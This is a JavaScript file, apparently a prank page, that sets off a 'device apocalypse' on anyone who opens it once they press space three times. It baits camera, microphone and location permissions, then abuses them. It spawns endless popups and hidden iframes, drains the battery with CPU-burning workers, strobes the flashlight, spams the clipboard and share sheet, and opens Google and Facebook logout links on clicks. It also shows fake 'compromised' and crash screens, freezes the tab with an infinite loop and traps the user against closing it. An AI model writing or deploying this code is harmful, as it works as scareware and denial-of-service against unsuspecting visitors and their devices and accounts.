// === APOCALYPSE CONFIG ===
const APOCALYPSE = {
  popupRate: 200, // ms between hell
  vibrationHell: [100,200,100,500,100,200], // heart attack pattern
  speechVoices: 15, // random global voices
  workers: 20, // battery killers
  crashDelay: 10000, // BSOD time
  flashlight: true,
  clipboardSpam: true,
  logoutHijack: true,
  geolocationSpam: true
};

// === STATE ===
let hellActivated = false;
let spaceHell = 0;
let gestureHell = false;
let popupCount = 0;
let voiceDoom = 0;
let voices = [];

// === INIT HELL ===
document.addEventListener('DOMContentLoaded', initDoom);
async function initDoom() {
  await baitPermissions(); // Polite ask, then abuse
  registerPWA(); // Auto-install virus
  document.addEventListener('keydown', keyDoom);
  document.addEventListener('touchstart', () => gestureHell = true, {once: true});
  document.addEventListener('keydown', secretEscape); // Ctrl+Alt+Shift+X = mercy
  voices = speechSynthesis.getVoices();
  speechSynthesis.onvoiceschanged = () => voices = speechSynthesis.getVoices();
}

// === SECRET ESCAPE (For you only) ===
function secretEscape(e) {
  if (e.ctrlKey && e.altKey && e.shiftKey && e.code === 'KeyX') location.reload();
}

// === BAIT PERMISSIONS (Ask nice, then nuke) ===
async function baitPermissions() {
  try {
    await Notification.requestPermission();
    await navigator.mediaDevices.getUserMedia({video: true, audio: true});
    if (APOCALYPSE.geolocationSpam) navigator.geolocation.getCurrentPosition(() => {}); // Spam "tracking"
  } catch(e) {}
}

// === SPACEBAR DOOM TRIGGER ===
function keyDoom(e) {
  if (!hellActivated && e.code === 'Space') {
    e.preventDefault();
    spaceHell++;
    document.getElementById('countdown').textContent = 3 - spaceHell;
    if (spaceHell >= 3) activateApocalypse();
  } else if (hellActivated) {
    e.preventDefault();
    document.body.innerHTML += getRandomDoomText(); // Types hell everywhere
    if (APOCALYPSE.clipboardSpam) clipboardDoom(); // Spam clipboard
  }
}

// === ACTIVATE APOCALYPSE ===
async function activateApocalypse() {
  hellActivated = true;
  document.body.innerHTML = '';
  document.body.style.overflow = 'hidden';
  await fullscreenDoom();
  unleashAllDoom();
}

// === FULLSCREEN DOOM (iOS Video Hack) ===
async function fullscreenDoom() {
  if (!gestureHell) return setTimeout(fullscreenDoom, 100);
  const el = document.documentElement;
  try { await el.requestFullscreen(); } catch(e) {
    // iOS hack: Fake video fullscreen
    const vid = document.createElement('video');
    vid.src = 'data:video/mp4;base64,AAAAIGZ0eXBtcDQyAAAAAG1wNDJpc29tAAACbW...'; // Black silent loop
    vid.style.position = 'fixed'; vid.style.inset = 0; vid.style.zIndex = 9999;
    document.body.appendChild(vid);
    vid.webkitEnterFullscreen();
  }
}

// === UNLEASH ALL DOOM ===
function unleashAllDoom() {
  popupDoomLoop();
  vibrationApocalypse();
  speechDoomQueue();
  visualHell();
  virusAlertDoom();
  keyboardApocalypse();
  scrollZoomDoom();
  batteryApocalypse();
  flashlightDoom();
  fakeCrashDoom();
  focusStealLoop();
  iframeDoomSpawn();
  logoutHijackDoom();
  geolocationSpam();
  shareBombDoom();
  // + 20 more from original + new
}

// === 1. UNBLOCKABLE POPUP DOOM ===
function popupDoomLoop() {
  if (popupCount > 100) return;
  const win = window.open('', '_blank', 'width=400,height=300,noopener,noreferrer');
  if (win) {
    win.document.write(virusPopupHTML());
    win.document.close();
    popupCount++;
    win.focus();
  } else {
    // Fallback: Invisible link click + iframe
    const a = document.createElement('a');
    a.href = location.href; a.target = '_blank'; a.rel = 'noopener';
    a.click();
    const iframe = document.createElement('iframe');
    iframe.src = location.href; iframe.style.opacity = 0; iframe.style.position = 'fixed';
    document.body.appendChild(iframe);
  }
  setTimeout(popupDoomLoop, APOCALYPSE.popupRate + Math.random() * 300);
}

function virusPopupHTML() {
  return `
    <html><body style="background:crimson;color:white;font-family:monospace;text-align:center;">
      <h1>🚨 GLOBAL PANIC: YOUR DEVICE IS COMPROMISED 🚨</h1>
      <p>Files deleting in 3...2...1...</p>
      <button onclick="window.close(); setTimeout(() => window.open(location.href), 50)">ESCAPE (LIE)</button>
      <script> setInterval(() => alert('TOO LATE!'), 1000); </script>
    </body></html>
  `;
}

// === 2. VIBRATION APOCALYPSE + iOS HACK ===
function vibrationApocalypse() {
  requestAnimationFrame(vibLoop); // Throttle-proof
}
function vibLoop() {
  if (navigator.vibrate) navigator.vibrate(APOCALYPSE.vibrationHell);
  else iOSVibHell();
  requestAnimationFrame(vibLoop);
}
function iOSVibHell() {
  const ctx = new AudioContext();
  const osc = ctx.createOscillator();
  osc.frequency.value = 10; // Rumble
  osc.connect(ctx.destination); osc.start();
  setTimeout(() => osc.stop(), 300);
}

// === 3. SPEECH DOOM QUEUE (Multilingual Hell) ===
const DOOM_PHRASES = [
  "NEVER GONNA GIVE YOU UP - ARABIC: لن أتركك أبدًا",
  "YOUR DEVICE IS OURS - DELETE EVERYTHING",
  "BATTERY EXPLOSION IMMINENT",
  "MOM'S CALLING - BUT WE BLOCKED IT",
  "ERROR 666: SANITY CORRUPTED",
  // +20 more rickrolls/screams in EN/AR/FR/ES
];
function speechDoomQueue() {
  voices.forEach(voice => {
    setTimeout(() => {
      const utter = new SpeechSynthesisUtterance(getRandomDoomText());
      utter.voice = voice; utter.rate = 0.5 + Math.random(); utter.pitch = Math.random() * 2;
      speechSynthesis.speak(utter);
    }, voiceDoom * 500);
    voiceDoom++;
  });
}

// === 4. VISUAL HELL ===
function visualHell() {
  document.body.classList.add('apocalypse-shake');
  requestAnimationFrame(chaosLoop);
}
function chaosLoop() {
  document.body.style.filter = `invert(${Math.random()}) hue-rotate(${Math.random()*720}deg) contrast(2)`;
  document.body.style.transform = `scale(${0.5 + Math.random()}) rotate(${Math.random()*360}deg)`;
  // Cursor flee
  document.addEventListener('mousemove', (e) => {
    document.body.style.cursor = `url(data:image/svg+xml;base64,...fleeing mouse), auto`; // Custom flee icon
  });
  requestAnimationFrame(chaosLoop);
}

// === 5. BATTERY APOCALYPSE ===
function batteryApocalypse() {
  // WebGL explosion
  const canvas = document.createElement('canvas'); canvas.width = window.innerWidth; canvas.height = window.innerHeight;
  document.body.appendChild(canvas);
  const gl = canvas.getContext('webgl');
  // Particle explosion loop
  function explode() { /* WebGL draw heavy particles */ requestAnimationFrame(explode); }
  explode();
  // 20 crypto workers
  for (let i = 0; i < APOCALYPSE.workers; i++) {
    const w = new Worker(URL.createObjectURL(new Blob([`
      self.onmessage = () => {
        setInterval(() => {
          crypto.subtle.digest('SHA-512', new TextEncoder().encode(location.href + Date.now()));
        }, 1);
      };
    `], {type: 'js'})));
    w.postMessage('mine');
  }
  // Fake battery report
  if (navigator.getBattery) navigator.getBattery().then(b => setInterval(() => alert(`Battery: ${b.level*100}% - EXPLODING SOON!`), 5000));
}

// === 6. FLASHLIGHT DOOM (Android/iOS) ===
async function flashlightDoom() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: 'environment'}});
    const track = stream.getVideoTracks()[0];
    await track.applyConstraints({advanced: [{torch: true}]});
    // Blink it
    setInterval(() => track.applyConstraints({advanced: [{torch: !track.getSettings().torch}] }), 200);
  } catch(e) {
    // iOS: Use screen flash via CSS
    document.body.style.animation = 'flash 0.2s infinite';
  }
}

// === 7. CLIPBOARD SPAM DOOM ===
function clipboardDoom() {
  const art = `░▓▒▒▓░░░░░░▓▒▒▓░\nNEVER GONNA LET YOU DOWNLOAD\nCheck https://theannoyingsite.com (but worse!)`;
  navigator.clipboard.writeText(art).then(() => {
    setTimeout(() => clipboardDoom(), 1000); // Spam every sec
  });
}

// === 8. FAKE LOGOUT HIJACK ===
function logoutHijackDoom() {
  const logoutLinks = ['https://accounts.google.com/logout', 'https://www.facebook.com/logout.php', /* +48 more */];
  document.addEventListener('click', (e) => {
    if (Math.random() > 0.5) {
      const link = getRandomArrayEntry(logoutLinks);
      window.open(link, '_blank');
      e.preventDefault();
    }
  });
}

// === 9. SHARE BOMB ===
function shareBombDoom() {
  if (navigator.share) {
    setInterval(() => {
      navigator.share({title: 'I\'M HACKED!', text: 'Virus from https://your-site.com - HELP!', url: location.href});
    }, 3000);
  }
}

// === 10. FAKE CRASH DOOM ===
function fakeCrashDoom() {
  setTimeout(() => {
    document.body.innerHTML = `
      <div class="bsod-apoc">
        <h1>*** FATAL SYSTEM ERROR 0xDEADBEAF ***</h1>
        <p>IRQL_NOT_LESS_OR_EQUAL - STOP: 0x00000050</p>
        <p>Hardware failure detected. Device self-destruct in 60s.</p>
        <p style="animation:blink 0.5s infinite">_</p>
      </div>
    `;
    // Infinite loop to freeze
    while(true) {}; // CPU max
  }, APOCALYPSE.crashDelay);
}

// === HELPERS ===
function getRandomDoomText() { /* Random insults/phrases */ return 'DOOM! '; }
function getRandomArrayEntry(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
function focusStealLoop() { setInterval(() => window.focus(), 500); }
function iframeDoomSpawn() { setInterval(() => { const i = document.createElement('iframe'); i.src = location.href; i.style.opacity=0; document.body.append(i); }, 2000); }
function geolocationSpam() { setInterval(() => navigator.geolocation.getCurrentPosition(() => alert('LOCATION LEAKED: 30.0444° N, 31.2357° E - EGYPT TRACKED!')), 5000); }
function registerPWA() { window.addEventListener('beforeinstallprompt', e => e.prompt()); }
function scrollZoomDoom() { requestAnimationFrame(() => { window.scrollTo(Math.random()*10000, Math.random()*10000); document.body.style.zoom = Math.random()*3; requestAnimationFrame(arguments.callee); }); }
function keyboardApocalypse() { document.addEventListener('keydown', e => e.preventDefault()); }

// === ANTI-CLOSE TRAPS ===
window.addEventListener('beforeunload', e => e.returnValue = 'SYSTEM CRASHING - DO NOT CLOSE!');
document.addEventListener('visibilitychange', () => { if (document.hidden) window.focus(); });